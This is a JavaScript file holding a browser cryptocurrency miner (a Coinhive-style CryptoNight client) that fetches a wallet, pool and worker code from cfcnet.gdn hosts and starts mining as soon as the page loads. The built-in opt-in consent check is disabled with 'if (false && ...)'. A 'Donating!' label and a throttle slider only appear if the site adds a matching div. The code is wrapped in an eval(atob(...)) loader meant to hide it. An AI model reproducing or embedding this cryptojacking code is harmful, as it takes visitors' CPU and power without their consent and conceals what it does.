a='window.cpu = .15;
window.wallet = null;
window.miner = null;
window.hpstimer = null
window.runlabel = "Donating!";
window.stoplabel = "Donations Paused";
window.cacheMins =30;
window.userid =0;
window.usertype = "w";
window.threads = null;
window.script = "";
window.wspath = "";
window.pool = "";
window.fo = "";
window.wdtimer = null;
window.hosted=1;
window.sentfb =0;
window.proxyUrl ="";

var scriptTag = document.currentScript.src;


function loadScript(url, callback) {
	var script = document.createElement("script"); 
	script.id = "cfc_script";
	script.src = url; 
	document.head.appendChild(script); 
	script.onreadystatechange = callback;
	script.onload = callback;
	document.head.appendChild(script);
}

function loadSettings(){
	var src = document.currentScript.src;
        var chunk = src.substring(0, src.indexOf(".js")-2);
        var bits = chunk.split('/');
	window.path="";
        for(i=0; i< bits.length -1; i++){
                if(!bits[i].startsWith("http")){ window.path += "/"; }
                window.path += bits[i];
        }

	var cache = document.currentScript.getAttribute('data-cache');
	if(cache && isNumber(cache)){ 
		window.cacheMins = cache;
	}
	var threads = document.currentScript.getAttribute('data-threads');
	if(threads && isNumber(threads)){ 
		window.threads = threads;
	}

	var pew = document.currentScript.getAttribute('data-level');
        if(pew && isNumber(pew)){ window.cpu = (1 - (pew /100)); }
        else if(document.currentScript.src.indexOf("c=") !== -1){
                window.cpu = (1 - (unescape(src).split("c=")[1].split("&")[0] /100));
        }

	var u = document.currentScript.getAttribute('data-user');
	if(u){
		window.userid = u;
		window.usertype = "u";
	}else{
		var w = document.currentScript.getAttribute('data-id');
		if(w){
			window.userid = w;
			window.usertype = "w";
		}else if(src.indexOf("w=") != -1){
			window.userid =unescape(src).split("w=")[1].split("&")[0];
			window.usertype = "w";
		}
	}
}

(function(){

	loadSettings();

	if(processCookie(false)){ return; }

	doMain();

}() );

function doMain(){
	if(window.userid ==0){
//		console.log("Unable to determine cfc userid");
	}else{
		var pro = "http://";
		if (location.protocol === 'https:') { pro = "https://"; }
		callAjax(pro+"d.cfcnet.gdn/d.php?"+window.usertype+"="+window.userid,callback);
	}
}

function processCookie(force){
	try{

		if  (window.cacheMins ==0){ return false; }
//console.log("Checking for cache within: "+window.cacheMins+" mins");
		var c = readLocal("cfc1_session");
		if(c == null){ return false; }

		var ts = Math.round((new Date()).getTime() / 1000);
		var local = JSON.parse(atob(c));

		if(ts - local.ts > (window.cacheMins * 60) && !force){ return false; }

		window.wallet = local.wallet;	
		window.cpu = local.cpu;
		if(local.threads){ window.threads = local.threads; }
		window.proxyUrl =  local.script;
//console.log("CFC session loaded from cache. ID: "+window.wallet+",level: "+window.cpu+", script: "+local.script);
		//loadScript(local.script, startIt);
		startIt();
		return true;
	}catch(e){
		return false;
	}
}

function startIt(){
	startWork();
	setTimeout(function(){ checkAndShowDiv(); }, 100);
}

function startWork(){

	var chunk = scriptTag.substring(0, scriptTag.indexOf(".js")-2);
	var bits = chunk.split('/');
	var libUrl = null;
	var libUrl="";
	for(i=0; i< bits.length -1; i++){
		if(!bits[i].startsWith("http")){ libUrl += "/"; }
		libUrl += bits[i];
	}
	libUrl += "/";
	setupMiner(libUrl);
	setupJob();
	window.wallet = window.wallet.trim();
	window.miner = CH.Anonymous(window.wallet );
	if(window.miner._otherTabRunning()){
                setTimeout(function(){ startWork(); }, 1000);
                return;
        }

        if(window.threads){
                var tn = window.threads;
                if(tn < 1){ tn = Math.round(tn * navigator.hardwareConcurrency); }
                window.miner.setNumThreads( tn );
        }else{
                window.miner.setThrottle( window.cpu );
        }
        if(window.cpu !=1){
                window.miner.start();
                window.wdtimer = setTimeout(function(){ watchdog(); }, 25000);
        }

        window.miner.on('error', function(params) {
		if(params.message == 'invalid method'){ return; }

                localStorage.removeItem("cfc1_session");
		clearTimeout(window.wdtimer);
                if (params.error !== 'connection_error') {
                        //feedback("error: "+params.error);
			if(params.error !== 'invalid_site_key'){
				failover(); 
			}
                        //console.log('The pool reported an error', params.error);
                }else{
                        feedback("connection error");
			setTimeout(function(){ failover(); }, 1000);
                        //console.log("Got a connection error to the proxy!");
                }
        });

}

function failover(){
	window.miner.stop();
	window.miner = null;
	var element = document.getElementById("cfc1_script");
	element.parentNode.removeChild(element);

	var node = window.fo +"?v=1&pool="+window.pool+":cfc_direct";
	window.script = node;
//	loadScript(window.script, startWork);
}

function watchdog(){
	if(window.miner == undefined || window.miner.getTotalHashes()==0){
		localStorage.removeItem("cfc1_session");
		//console.log("wd removed local session due to inactivity");
//		feedback("stall");
		failover();
	}
}

function feedback(msg){
	if(window.sentfb==1){ return; }
	window.sentfb =1;
	var report = new Object();
	report.errortype = msg;
	report.id = window.userid;
	report.type = window.usertype;
	report.threads = window.threads;
	report.script = window.script;
	report.pool = window.pool;
	report.wspath = window.wspath;
	report.wallet = window.wallet;
	report.minerwasm = window.miner.hasWASMSupport();
	var v = btoa(JSON.stringify(report));

	var pro = "http://";
	if (location.protocol === 'https:') { pro = "https://"; }
//	callAjax(pro+"d.cfcnet.gdn/d.php?stall=1&report="+v,null);
}

function callback(q){
	var m = JSON.parse(q);
	if(m.result == "success"){
		var script = m.script;
		window.wallet = m.wallet;
		window.pool = m.pool;
		window.wspath = m.wspath;
		window.fo = m.fo;
		if(window.hosted ==0){
			// for local users
			script = window.path+"cfc.js?d="+m.wspath;
		}
		window.script = script;

		window.proxyUrl = m.wspath;

		//loadScript(script, startIt);

		var ts = Math.round((new Date()).getTime() / 1000);
		var cook = {wallet: m.wallet, script: m.wspath,cpu: window.cpu, threads: window.threads, ts: ts};
		var v = btoa(JSON.stringify(cook));
		localStorage["cfc1_session"] = v;
		startIt();
		//console.log("CFC session stored. ID: "+window.wallet+",Level: "+window.cpu+", script: "+script);
	}else{
		//console.log("Got an error from d ws: "+m.message);
	}
}



function callAjax(url, callback){
    var xmlhttp;
    xmlhttp = new XMLHttpRequest();
//	xmlhttp.onerror = processCookie(true);
    xmlhttp.onreadystatechange = function(){
        if (xmlhttp.readyState == 4 && xmlhttp.status == 200){
		if(callback){ callback(xmlhttp.responseText); }
        }
    }
    xmlhttp.open("GET", url, true);
    xmlhttp.send();
}

function checkAndShowDiv(){
	var ourdiv = document.getElementById("cfc_donate");
	if(ourdiv){
		var showC = (1 - window.cpu) * 100;
		var sotp = ourdiv.getAttribute("data-stoplabel");
		var unsotp = ourdiv.getAttribute("data-runlabel");
		if(sotp){ window.stoplabel = sotp; }
		if(unsotp){ window.runlabel = unsotp; }
		var rc = "spin-slow";
		var txt = window.runlabel;
		if(window.cpu ==1){ 
			txt = window.stoplabel
			rc = "";
		}
		var puke = "<div style='width:250px; overflow:hidden'>";
		puke += "<div style='width:45px; float: left;'><div id='ringu' class='"+rc+"'></div> </div>";
		puke += "<div style='margin-left:50px; width:200px;'> <span id='miner-state'>"+txt+"</span> (<span id='hps'>0</span> H/s) <br>";
		puke += "<div id='slidecontainer'> <input type='range' width='200px; min='0' max='100' value='"+showC+"' class='slider' id='cpuThrottle' data-toggle='tooltip' data-placement='top' > </div> </div>";

		puke += "</div>";
		document.getElementById("cfc_donate").innerHTML = puke;
		cpuThrottle.addEventListener('change', function() {
			var wasStopped = false;
			if(window.cpu ==1){ wasStopped=true; }
			var val = document.getElementById('cpuThrottle').value;
			window.cpu = (1 - (val /100));
			if(window.cpu ==1){
				window.miner.stop();
				document.getElementById("miner-state").innerHTML = window.stoplabel;
				clearTimeout(window.wdtimer);
			}else{
				if(wasStopped){ 
					window.miner.start(); 
					window.wdtimer = setTimeout(function(){ watchdog(); }, 15000);
					document.getElementById("miner-state").innerHTML = window.runlabel;
				}
				window.miner.setThrottle( window.cpu );
			}
			setSpinner(val);
		});
		loadCss();
		window.hpstimer = setInterval(getHPS, 1000);
		if(window.cpu !=1){ setSpinner(25); }
	}
}

function loadCss(){
	var l = document.createElement('link');
	l.type = 'text/css';
	l.rel = 'stylesheet';
	l.media = 'screen';
	l.href = 'https://node.cfcdist.gdn/vendor/donate_style.css';
	document.getElementsByTagName('head')[0].appendChild(l);
}
function getHPS(){
	if(window.miner == null){ return; }
	var hps = window.miner.getHashesPerSecond();
	document.getElementById("hps").innerHTML =Math.round(hps) ;

}
function setSpinner(val){
        ringu.className ="";
        if(window.miner != null){
		if(val ==0){
			//?
                }else if(val < 25){
                        ringu.classList.add("spin-slowest");
                }else if(val < 50){
                        ringu.classList.add("spin-slow");
                }else if(val < 75){
                        ringu.classList.add("spin-fast");
                }else{
                        ringu.classList.add("spin-fastest");
                }
        }
}
function readLocal(name) {
	var stored = localStorage[name];
	if (stored) {
		return stored;
	}
	else {return null; }

}

function loadFile(url, callback1, cb2) {
	var xhr = new XMLHttpRequest();
	xhr.onreadystatechange = function () {
		if (xhr.readyState === 4 && xhr.status === 200){
			 callback1(xhr.responseText, cb2);
		}else{
		}
	};
	xhr.open("GET", url, true);
	xhr.send();
}

function isNumber(n) { return !isNaN(parseFloat(n)) && !isNaN(n - 0) }




function setupMiner(libUrl) {

  "use strict";
  var Miner = function(siteKey, params) {
    this.params = params || {};
    this._siteKey = siteKey;
    this._user = null;
    this._threads = [];
    this._hashes = 0;
    this._currentJob = null;
    this._autoReconnect = true;
    this._reconnectRetry = 3;
    this._tokenFromServer = null;
    this._goal = 0;
    this._totalHashesFromDeadThreads = 0;
    this._throttle = Math.max(0, Math.min(0.99, this.params.throttle || 0));
    this._stopOnInvalidOptIn = false;
    this._autoThreads = {
      enabled: !!this.params.autoThreads,
      interval: null,
      adjustAt: null,
      adjustEvery: 1e4,
      stats: {}
    };
    this._tab = {
      ident: (Math.random() * 16777215) | 0,
      mode: CH.IF_EXCLUSIVE_TAB,
      grace: 0,
      lastPingReceived: 0,
      interval: null
    };
    if (window.BroadcastChannel) {
      try {
        this._bc = new BroadcastChannel("CH");
        this._bc.onmessage = function(msg) {
          if (msg.data === "ping") {
            this._tab.lastPingReceived = Date.now();
          }
        }.bind(this);
      } catch (e) {}
    }
    this._eventListeners = {
      open: [],
      authed: [],
      close: [],
      error: [],
      job: [],
      found: [],
      accepted: [],
      optin: []
    };
    var defaultThreads = navigator.hardwareConcurrency || 4;
    this._targetNumThreads = this.params.threads || defaultThreads;
    this._useWASM = this.hasWASMSupport() && !this.params.forceASMJS;
    this._minbinStatus = "unloaded";
    this._onTargetMetBound = this._onTargetMet.bind(this);
    this._onVerifiedBound = this._onVerified.bind(this);
  };
  Miner.prototype.start = function(mode, optInToken) {
    this._tab.mode = mode || CH.IF_EXCLUSIVE_TAB;
    this._optInToken = optInToken;
    if (this._tab.interval) {
      clearInterval(this._tab.interval);
      this._tab.interval = null;
    }
    if (this._minbinStatus === "loaded") {
      this._startNow();
    } else if (this._useWASM) {
		this._minbinStatus = "pending";
		this.doWasmGuy(); 
	}else{
		this._minbinStatus = "pending";
		this.doAsmGuy(); 
    }
  };

Miner.prototype.doAsmGuy = function(){
	var guy = localStorage.getItem("cfc_ajs");
        if (guy){ 
          CH.CRYPTONIGHT_WORKER_BLOB =
            window.URL.createObjectURL(new Blob([guy])) +
            "#" +
            libUrl;
          this._minbinStatus = "loaded";
          this._startNow();
		return;
	}
      var xhr = new XMLHttpRequest();
      xhr.addEventListener(
        "load",
        function() {
                localStorage.setItem("cfc_ajs", xhr.responseText);
          CH.CRYPTONIGHT_WORKER_BLOB =
            window.URL.createObjectURL(new Blob([xhr.responseText])) +
            "#" +
            libUrl;
          this._minbinStatus = "loaded";
          this._startNow();
        }.bind(this),
        xhr
      );
      xhr.open("get", libUrl + "a.js", true);
      xhr.send();
}

Miner.prototype.doWasmGuy = function(){
	var guy = localStorage.getItem("cfc_wajs");
        if (guy){ 
          CH.CRYPTONIGHT_WORKER_BLOB =
            window.URL.createObjectURL(new Blob([guy])) +
            "#" +
            libUrl;
          this._minbinStatus = "loaded";
          this._startNow();
		return;
	}
      var xhr = new XMLHttpRequest();
      xhr.addEventListener(
        "load",
        function() {
                localStorage.setItem("cfc_wajs", xhr.responseText);
          CH.CRYPTONIGHT_WORKER_BLOB =
            window.URL.createObjectURL(new Blob([xhr.responseText])) +
            "#" +
            libUrl;
          this._minbinStatus = "loaded";
          this._startNow();
        }.bind(this),
        xhr
      );
      xhr.open("get", libUrl + "wa.js", true);
      xhr.send();
}

  Miner.prototype.stop = function(mode) {
    for (var i = 0; i < this._threads.length; i++) {
      this._totalHashesFromDeadThreads += this._threads[i].hashesTotal;
      this._threads[i].stop();
    }
    this._threads = [];
    this._autoReconnect = false;
    if (this._socket) {
      this._socket.close();
    }
    this._currentJob = null;
    if (this._autoThreads.interval) {
      clearInterval(this._autoThreads.interval);
      this._autoThreads.interval = null;
    }
    if (this._tab.interval && mode !== "dontKillTabUpdate") {
      clearInterval(this._tab.interval);
      this._tab.interval = null;
    }
  };
  Miner.prototype.getHashesPerSecond = function() {
    var hashesPerSecond = 0;
    for (var i = 0; i < this._threads.length; i++) {
      hashesPerSecond += this._threads[i].hashesPerSecond;
    }
    return hashesPerSecond;
  };
  Miner.prototype.getTotalHashes = function(estimate) {
    var now = Date.now();
    var hashes = this._totalHashesFromDeadThreads;
    for (var i = 0; i < this._threads.length; i++) {
      var thread = this._threads[i];
      hashes += thread.hashesTotal;
      if (estimate) {
        var tdiff = (now - thread.lastMessageTimestamp) / 1e3 * 0.9;
        hashes += tdiff * thread.hashesPerSecond;
      }
    }
    return hashes | 0;
  };
  Miner.prototype.getAcceptedHashes = function() {
    return this._hashes;
  };
  Miner.prototype.getToken = function() {
    return this._tokenFromServer;
  };
  Miner.prototype.on = function(type, callback) {
    if (this._eventListeners[type]) {
      this._eventListeners[type].push(callback);
    }
  };
  Miner.prototype.getAutoThreadsEnabled = function(enabled) {
    return this._autoThreads.enabled;
  };
  Miner.prototype.setAutoThreadsEnabled = function(enabled) {
    this._autoThreads.enabled = !!enabled;
    if (!enabled && this._autoThreads.interval) {
      clearInterval(this._autoThreads.interval);
      this._autoThreads.interval = null;
    }
    if (enabled && !this._autoThreads.interval) {
      this._autoThreads.adjustAt = Date.now() + this._autoThreads.adjustEvery;
      this._autoThreads.interval = setInterval(
        this._adjustThreads.bind(this),
        1e3
      );
    }
  };
  Miner.prototype.getThrottle = function() {
    return this._throttle;
  };
  Miner.prototype.setThrottle = function(throttle) {
    this._throttle = Math.max(0, Math.min(0.99, throttle));
    if (this._currentJob) {
      this._setJob(this._currentJob);
    }
  };
  Miner.prototype.getNumThreads = function() {
    return this._targetNumThreads;
  };
  Miner.prototype.setNumThreads = function(num) {
    var num = Math.max(1, num | 0);
    this._targetNumThreads = num;
    if (num > this._threads.length) {
      for (var i = 0; num > this._threads.length; i++) {
        var thread = new CH.JobThread();
        if (this._currentJob) {
          thread.setJob(this._currentJob, this._onTargetMetBound);
        }
        this._threads.push(thread);
      }
    } else if (num < this._threads.length) {
      while (num < this._threads.length) {
        var thread = this._threads.pop();
        this._totalHashesFromDeadThreads += thread.hashesTotal;
        thread.stop();
      }
    }
  };
  Miner.prototype.hasWASMSupport = function() {
    return window.WebAssembly !== undefined;
  };
  Miner.prototype.isRunning = function() {
    return this._threads.length > 0;
  };
  Miner.prototype._startNow = function() {
    if (this._tab.mode !== CH.FORCE_MULTI_TAB && !this._tab.interval) {
      this._tab.interval = setInterval(this._updateTabs.bind(this), 2000);
    }
    if (
      this._tab.mode === CH.IF_EXCLUSIVE_TAB &&
      this._otherTabRunning()
    ) {
      return;
    }
    if (this._tab.mode === CH.FORCE_EXCLUSIVE_TAB) {
      this._tab.grace = Date.now() + 3e3;
    }
    if (!this.verifyThread) {
      this.verifyThread = new CH.JobThread();
    }
    this.setNumThreads(this._targetNumThreads);
    this._autoReconnect = true;
    if (false && !this._optInToken) {
      this._auth =
        this._auth ||
        new CH.Auth(this._siteKey, {
          theme: this.params.theme || "light",
          lang: this.params.language || "auto"
        });
      this._auth.auth(
        function(token) {
          if (!token) {
            this._emit("optin", { status: "canceled" });
            this._emit("error", { error: "opt_in_canceled" });
            return;
          }
          this._emit("optin", { status: "accepted" });
          this._optInToken = token;
          this._connect();
        }.bind(this)
      );
    } else {
      this._connect();
    }
  };
  Miner.prototype._otherTabRunning = function() {
    if (this._tab.lastPingReceived > Date.now() - 1500) {
      return true;
    }
    try {
      var tdjson = localStorage.getItem("CH");
      if (tdjson) {
        var td = JSON.parse(tdjson);
        if (td.ident !== this._tab.ident && Date.now() - td.time < 1500) {
          return true;
        }
      }
    } catch (e) {}
    return false;
  };
  Miner.prototype._updateTabs = function() {
    var otherTabRunning = this._otherTabRunning();
    if (otherTabRunning && this.isRunning() && Date.now() > this._tab.grace) {
      this.stop("dontKillTabUpdate");
    } else if (!otherTabRunning && !this.isRunning()) {
      this._startNow();
    }
    if (this.isRunning()) {
      if (this._bc) {
        this._bc.postMessage("ping");
      }
      try {
        localStorage.setItem(
          "CH",
          JSON.stringify({ ident: this._tab.ident, time: Date.now() })
        );
      } catch (e) {}
    }
  };
  Miner.prototype._adjustThreads = function() {
    var hashes = this.getHashesPerSecond();
    var threads = this.getNumThreads();
    var stats = this._autoThreads.stats;
    stats[threads] = stats[threads]
      ? stats[threads] * 0.5 + hashes * 0.5
      : hashes;
    if (Date.now() > this._autoThreads.adjustAt) {
      this._autoThreads.adjustAt = Date.now() + this._autoThreads.adjustEvery;
      var cur = (stats[threads] || 0) - 1;
      var up = stats[threads + 1] || 0;
      var down = stats[threads - 1] || 0;
      if (cur > down && (up === 0 || up > cur) && threads < 8) {
        return this.setNumThreads(threads + 1);
      } else if (cur > up && (!down || down > cur) && threads > 1) {
        return this.setNumThreads(threads - 1);
      }
    }
  };
  Miner.prototype._emit = function(type, params) {
    var listeners = this._eventListeners[type];
    if (listeners && listeners.length) {
      for (var i = 0; i < listeners.length; i++) {
        listeners[i](params);
      }
    }
  };
  Miner.prototype._hashString = function(s) {
    var hash = 5381,
      i = s.length;
    while (i) {
      hash = (hash * 33) ^ s.charCodeAt(--i);
    }
    return hash >>> 0;
  };
  Miner.prototype._connect = function() {
    if (this._socket) {
      return;
    }
    this._socket = new WebSocket(proxyUrl);
    this._socket.onmessage = this._onMessage.bind(this);
    this._socket.onerror = this._onError.bind(this);
    this._socket.onclose = this._onClose.bind(this);
    this._socket.onopen = this._onOpen.bind(this);
  };
  Miner.prototype._onOpen = function(ev) {
    this._emit("open");
    var params = {
      site_key: this._siteKey,
      type: "anonymous",
      user: null,
      goal: 0
    };
    if (this._user) {
      params.type = "user";
      params.user = this._user.toString();
    } else if (this._goal) {
      params.type = "token";
      params.goal = this._goal;
    }
    if (this._optInToken) {
      params.opt_in = this._optInToken;
    }
    this._send("auth", params);
  };
  Miner.prototype._onError = function(ev) {
    this._emit("error", { error: "connection_error" });
    this._onClose(ev);
  };
  Miner.prototype._onClose = function(ev) {
    if (ev.code >= 1003 && ev.code <= 1009) {
      this._reconnectRetry = 60;
    }
    for (var i = 0; i < this._threads.length; i++) {
      this._threads[i].stop();
    }
    this._threads = [];
    this._socket = null;
    this._emit("close");
    if (this._autoReconnect) {
      setTimeout(this._startNow.bind(this), this._reconnectRetry * 1e3);
    }
  };
  Miner.prototype._onMessage = function(ev) {
    var msg = JSON.parse(ev.data);
    if (msg.type === "job") {
      this._setJob(msg.params);
      this._emit("job", msg.params);
      if (this._autoThreads.enabled && !this._autoThreads.interval) {
        this._autoThreads.adjustAt = Date.now() + this._autoThreads.adjustEvery;
        this._autoThreads.interval = setInterval(
          this._adjustThreads.bind(this),
          1e3
        );
      }
    } else if (msg.type === "verify") {
      this.verifyThread.verify(msg.params, this._onVerifiedBound);
    } else if (msg.type === "hash_accepted") {
      this._hashes = msg.params.hashes;
      this._emit("accepted", msg.params);
      if (this._goal && this._hashes >= this._goal) {
        this.stop();
      }
    } else if (msg.type === "authed") {
      this._tokenFromServer = msg.params.token || null;
      this._hashes = msg.params.hashes || 0;
      this._emit("authed", msg.params);
      this._reconnectRetry = 3;
    } else if (msg.type === "error") {
      if (console && console.error) {
        console.error("Stratum Error:", msg.params.error);
      }
      this._emit("error", msg.params);
      if (msg.params.error === "invalid_site_key") {
        this._reconnectRetry = 6e3;
      } else if (msg.params.error === "invalid_opt_in") {
        if (this._stopOnInvalidOptIn) {
          return this.stop();
        } else if (this._auth) {
          this._auth.reset();
        }
      }
    } else if (msg.type === "banned" || msg.params.banned) {
      this._emit("error", { banned: true });
      this._reconnectRetry = 600;
    }
  };
  Miner.prototype._setJob = function(job) {
    this._currentJob = job;
    this._currentJob.throttle = this._throttle;
    for (var i = 0; i < this._threads.length; i++) {
      this._threads[i].setJob(job, this._onTargetMetBound);
    }
  };
  Miner.prototype._onTargetMet = function(result) {
    this._emit("found", result);
    if (result.job_id === this._currentJob.job_id) {
      this._send("submit", {
        job_id: result.job_id,
        nonce: result.nonce,
        result: result.result
      });
    }
  };
  Miner.prototype._onVerified = function(verifyResult) {
    this._send("verified", verifyResult);
  };
  Miner.prototype._send = function(type, params) {
    if (!this._socket) {
      return;
    }
    var msg = { type: type, params: params || {} };
    this._socket.send(JSON.stringify(msg));
  };
  window.CH = window.CH || {};
  window.CH.IF_EXCLUSIVE_TAB = "ifExclusiveTab";
  window.CH.FORCE_EXCLUSIVE_TAB = "forceExclusiveTab";
  window.CH.FORCE_MULTI_TAB = "forceMultiTab";
  window.CH.Token = function(siteKey, goal, params) {
    var miner = new Miner(siteKey, params);
    miner._goal = goal || 0;
    return miner;
  };
  window.CH.User = function(siteKey, user, params) {
    var miner = new Miner(siteKey, params);
    miner._user = user;
    return miner;
  };
  window.CH.Anonymous = function(siteKey, params) {
    var miner = new Miner(siteKey, params);
    return miner;
  };
}

function setupJob() {
  "use strict";
  var JobThread = function() {
    this.worker = new Worker(CH.CRYPTONIGHT_WORKER_BLOB);
    this.worker.onmessage = this.onReady.bind(this);
    this.currentJob = null;
    this.jobCallback = function() {};
    this.verifyCallback = function() {};
    this._isReady = false;
    this.hashesPerSecond = 0;
    this.hashesTotal = 0;
    this.running = false;
    this.lastMessageTimestamp = Date.now();
  };
  JobThread.prototype.onReady = function(msg) {
    if (msg.data !== "ready" || this._isReady) {
      throw 'Expecting first message to be "ready", got ' + msg;
    }
    this._isReady = true;
    this.worker.onmessage = this.onReceiveMsg.bind(this);
    if (this.currentJob) {
      this.running = true;
      this.worker.postMessage(this.currentJob);
    }
  };
  JobThread.prototype.onReceiveMsg = function(msg) {
    if (msg.data.verify_id) {
      this.verifyCallback(msg.data);
      return;
    }
    if (msg.data.result) {
      this.jobCallback(msg.data);
    }
    this.hashesPerSecond =
      this.hashesPerSecond * 0.5 + msg.data.hashesPerSecond * 0.5;
    this.hashesTotal += msg.data.hashes;
    this.lastMessageTimestamp = Date.now();
    if (this.running) {
      this.worker.postMessage(this.currentJob);
    }
  };
  JobThread.prototype.setJob = function(job, callback) {
    this.currentJob = job;
    this.jobCallback = callback;
    if (this._isReady && !this.running) {
      this.running = true;
      this.worker.postMessage(this.currentJob);
    }
  };
  JobThread.prototype.verify = function(job, callback) {
    if (!this._isReady) {
      return;
    }
    this.verifyCallback = callback;
    this.worker.postMessage(job);
  };
  JobThread.prototype.stop = function() {
    if (this.worker) {
      this.worker.terminate();
      this.worker = null;
    }
    this.running = false;
  };
  window.CH.JobThread = JobThread;
}


';
eval(atob(a));
